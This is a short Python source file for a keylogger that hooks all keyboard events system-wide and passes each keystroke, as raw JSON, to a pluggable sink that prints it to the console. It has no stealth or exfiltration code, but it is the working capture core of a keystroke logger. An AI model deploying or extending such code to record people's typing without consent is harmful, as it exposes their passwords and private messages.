import keyboard

from threading import Timer
from datetime import datetime

# Wrapper for keyboard events
# Contains any necessary formatting logic
class KeyPress:
    def __init__(self, event):
        self.raw = event.to_json()
        self.code = event.name
    
class Sink:
    def write(self, kp): raise NotImplementedError

class ConsoleSink(Sink):
    def write(self, kp):
        msg = kp.raw
        print(msg)

class KeyLogger:
    def __init__(self, sink):
        self.sink = sink

    # Create KeyPress objs from keyboard events
    # Then pipe them into a Sink
    def capture(self, event):
        kp = KeyPress(event=event)
        self.sink.write(kp)

    def start(self):
        keyboard.hook(callback=self.capture)
        keyboard.wait()

if __name__ == "__main__":
    cs = ConsoleSink()
    keylogger = KeyLogger(sink=cs)
    keylogger.start()

